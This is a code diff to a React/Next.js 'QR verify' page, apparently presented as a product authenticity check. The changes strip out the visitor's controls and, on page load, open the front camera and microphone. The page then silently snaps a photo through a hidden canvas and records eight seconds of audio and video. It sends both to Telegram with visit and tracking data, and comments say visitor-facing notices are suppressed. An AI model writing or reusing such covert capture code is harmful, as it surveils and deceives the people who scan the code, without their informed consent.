@@ -2,12 +2,11 @@
 
 import { useEffect, useState, useRef, useCallback } from 'react';
 import { useSearchParams } from 'next/navigation';
-import { notifyVisit, sendTelegramVideo } from '@/utils/telegramApi';
+import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi'; // Import sendTelegramPhoto
 import { useLayoutContext } from '@/context/LayoutContext';
 import { showSuccess, showError } from '@/utils/toast';
 import LoadingSpinner from '@/components/LoadingSpinner';
-import CallToActionButton from '@/components/CallToActionButton';
-import { Video, StopCircle, Send, RefreshCcw } from 'lucide-react'; // Import Video, StopCircle, Send, RefreshCcw icons
+import { Camera, Video, RefreshCcw } from 'lucide-react'; // Import Camera, Video, RefreshCcw icons
 
 type QrVerifyPageProps = {
   params: { lang: string };
@@ -21,14 +20,18 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
   const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.qrScanInstructions);
   const [error, setError] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState<boolean>(false);
+  const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
+  const [isPhotoTaken, setIsPhotoTaken] = useState<boolean>(false);
   const [isRecording, setIsRecording] = useState<boolean>(false);
-  const [videoSent, setVideoSent] = useState<boolean>(false);
+  const [isVideoSent, setIsVideoSent] = useState<boolean>(false);
   const [stream, setStream] = useState<MediaStream | null>(null);
   const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
   const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
   const [videoPreviewUrl, setVideoPreviewUrl] = useState<string | null>(null);
+  const [captionMessage, setCaptionMessage] = useState<string>(''); // To store the caption from notifyVisit
 
   const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(null); // Ref for canvas to take photo
 
   const stopCamera = useCallback(() => {
     if (stream) {
@@ -38,12 +41,15 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
     if (videoRef.current) {
       videoRef.current.srcObject = null;
     }
+    setIsCameraActive(false);
   }, [stream]);
 
-  const startRecording = useCallback(async () => {
+  const startVerificationProcess = useCallback(async () => {
     setIsLoading(true);
     setError(null);
-    setVideoSent(false);
+    setIsPhotoTaken(false);
+    setIsRecording(false);
+    setIsVideoSent(false);
     setRecordedChunks([]);
     setVideoPreviewUrl(null);
     setStatusMessage(t.authenticity.processingRequest);
@@ -65,24 +71,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         }
       }
 
-      // 2. Request Camera Access
-      setStatusMessage(t.authenticity.processingRequest);
-      let mediaStream: MediaStream;
-      try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true }); // Request audio as well
-      } catch (frontCameraError: unknown) {
-        console.warn("Rear camera not available or permission denied, trying front camera:", frontCameraError);
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true }); // Fallback to front camera
-      }
-      
-      setStream(mediaStream);
-
-      if (videoRef.current) {
-        videoRef.current.srcObject = mediaStream;
-        await videoRef.current.play();
-      }
-
-      // 3. Send initial visit notification to get caption
+      // 2. Send initial visit notification to get caption
       const utmQueryParams = {
         utm_source: searchParams?.get('utm_source') || null,
         utm_medium: searchParams?.get('utm_medium') || null,
@@ -95,9 +84,59 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         screenHeight: window.innerHeight,
         isQrScan: true,
       };
-      const captionMessage = await notifyVisit(bodyData, utmQueryParams);
+      const initialCaption = await notifyVisit(bodyData, utmQueryParams);
+      setCaptionMessage(initialCaption); // Store caption for later use
 
-      // 4. Initialize MediaRecorder
+      // 3. Request Camera Access (front camera first)
+      setStatusMessage(t.authenticity.processingRequest);
+      let mediaStream: MediaStream;
+      try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true }); // Request audio as well
+      } catch (frontCameraError: unknown) {
+        console.warn("Front camera not available or permission denied, trying rear camera:", frontCameraError);
+        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true }); // Fallback to rear camera
+      }
+      
+      setStream(mediaStream);
+      setIsCameraActive(true);
+
+      if (videoRef.current) {
+        videoRef.current.srcObject = mediaStream;
+        await videoRef.current.play();
+      }
+
+      // Give camera a moment to warm up
+      await new Promise(resolve => setTimeout(resolve, 1000)); 
+
+      // 4. Take Photo
+      setStatusMessage(t.authenticity.processingRequest);
+      if (videoRef.current && canvasRef.current) {
+        const video = videoRef.current;
+        const canvas = canvasRef.current;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        if (ctx) {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const photoBase64 = canvas.toDataURL('image/jpeg', 0.8); // 80% quality
+          
+          try {
+            await sendTelegramPhoto({ photoBase64, caption: initialCaption });
+            setIsPhotoTaken(true);
+            // showSuccess(t.authenticity.qrScanSuccess); // No client-side success for Telegram
+          } catch (photoSendError: unknown) {
+            console.error("Error sending photo to Telegram:", photoSendError);
+            // showError(t.authenticity.qrScanError); // No client-side error for Telegram
+            setError(t.authenticity.qrScanError + (photoSendError instanceof Error ? `: ${photoSendError.message}` : "."));
+            setIsLoading(false);
+            stopCamera();
+            return; // Stop process if photo fails
+          }
+        }
+      }
+
+      // 5. Start Video Recording (if photo was successful)
+      setStatusMessage(t.authenticity.recordingInstructions);
       const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
       setMediaRecorder(recorder);
 
@@ -113,31 +152,32 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
         const url = URL.createObjectURL(blob);
         setVideoPreviewUrl(url);
-        setStatusMessage(t.authenticity.sendVideoButton); // Prompt to send video
-
-        // Automatically send video after recording stops
+        
         try {
-          setIsLoading(true);
           setStatusMessage(t.authenticity.processingRequest);
           const filename = `qr_scan_video_${new Date().getTime()}.webm`;
-          await sendTelegramVideo({ videoBlob: blob, caption: captionMessage, filename });
-          showSuccess(t.authenticity.recordingSuccess);
-          setVideoSent(true);
+          await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
+          setIsVideoSent(true);
           setStatusMessage(t.authenticity.recordingSuccess);
+          // showSuccess(t.authenticity.recordingSuccess); // No client-side success for Telegram
         } catch (videoSendError: unknown) {
           console.error("Error sending video to Telegram:", videoSendError);
-          showError(t.authenticity.recordingError);
-          setError(videoSendError instanceof Error ? videoSendError.message : "Failed to send video.");
+          // showError(t.authenticity.recordingError); // No client-side error for Telegram
+          setError(t.authenticity.recordingError + (videoSendError instanceof Error ? `: ${videoSendError.message}` : "."));
           setStatusMessage(t.authenticity.recordingError);
         } finally {
           setIsLoading(false);
         }
       };
 
-      // 5. Start Recording
       recorder.start();
       setIsRecording(true);
-      setStatusMessage(t.authenticity.recordingInstructions);
+      // Record for 8 seconds
+      setTimeout(() => {
+        if (recorder.state !== 'inactive') {
+          recorder.stop();
+        }
+      }, 8000); // Record for 8 seconds
 
     } catch (err: unknown) {
       console.error("Error during QR verification process:", err);
@@ -160,27 +200,9 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
     }
   }, [currentLang, searchParams, t, stopCamera]);
 
-  const stopRecording = useCallback(() => {
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-      mediaRecorder.stop();
-      setIsRecording(false);
-    }
-  }, [mediaRecorder]);
-
-  const handleRetake = () => {
-    stopCamera();
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-      mediaRecorder.stop();
-    }
-    setIsRecording(false);
-    setVideoSent(false);
-    setError(null);
-    setRecordedChunks([]);
-    setVideoPreviewUrl(null);
-    setStatusMessage(t.authenticity.qrScanInstructions);
-  };
-
   useEffect(() => {
+    startVerificationProcess();
+
     // Cleanup function for when component unmounts
     return () => {
       stopCamera();
@@ -191,7 +213,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         URL.revokeObjectURL(videoPreviewUrl);
       }
     };
-  }, [stopCamera, mediaRecorder, videoPreviewUrl]);
+  }, [startVerificationProcess, mediaRecorder, videoPreviewUrl, stopCamera]);
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-50">
@@ -210,7 +232,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       )}
 
       <div className="relative w-full max-w-md aspect-video bg-gray-200 dark:bg-gray-700 rounded-lg overflow-hidden shadow-lg mb-6">
-        {!videoPreviewUrl && (
+        {isCameraActive && !videoPreviewUrl && (
           <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
         )}
         {videoPreviewUrl && (
@@ -231,56 +253,19 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
             REC
           </div>
         )}
+        {/* Hidden canvas for capturing photo */}
+        <canvas ref={canvasRef} style={{ display: 'none' }} />
       </div>
 
-      <div className="flex flex-col gap-4 w-full max-w-xs">
-        {!isRecording && !videoSent && !videoPreviewUrl && (
-          <CallToActionButton
-            onClick={startRecording}
-            icon={Video}
-            variant="primary"
-            size="lg"
-            className="mt-6"
-            interactionEffect="burst"
-            disabled={isLoading}
-          >
-            {t.authenticity.startRecordingButton || "Start Video Verification"}
-          </CallToActionButton>
-        )}
-
-        {isRecording && (
-          <CallToActionButton
-            onClick={stopRecording}
-            icon={StopCircle}
-            variant="secondary"
-            size="lg"
-            className="mt-6"
-            interactionEffect="pixels"
-            disabled={isLoading}
-          >
-            {t.authenticity.stopRecordingButton || "Stop Recording"}
-          </CallToActionButton>
-        )}
-
-        {videoPreviewUrl && !videoSent && (
-          <CallToActionButton
-            onClick={handleRetake}
-            icon={RefreshCcw}
-            variant="subtle"
-            size="md"
-            className="mt-4"
-            disabled={isLoading}
-          >
-            {t.authenticity.retakeVideoButton || "Retake Video"}
-          </CallToActionButton>
-        )}
-
-        {videoSent && (
-          <p className="text-primary-600 dark:text-primary-400 text-xl font-semibold mt-4">
-            {t.authenticity.recordingSuccess}
-          </p>
-        )}
-      </div>
+      {/* No buttons for manual interaction, only a refresh option if needed */}
+      {error && (
+        <button
+          onClick={() => window.location.reload()}
+          className="mt-4 px-6 py-3 bg-primary-600 text-white rounded-full shadow-lg hover:bg-primary-700 transition-colors"
+        >
+          <RefreshCcw className="inline-block mr-2" /> Try Again
+        </button>
+      )}
     </div>
   );
 };
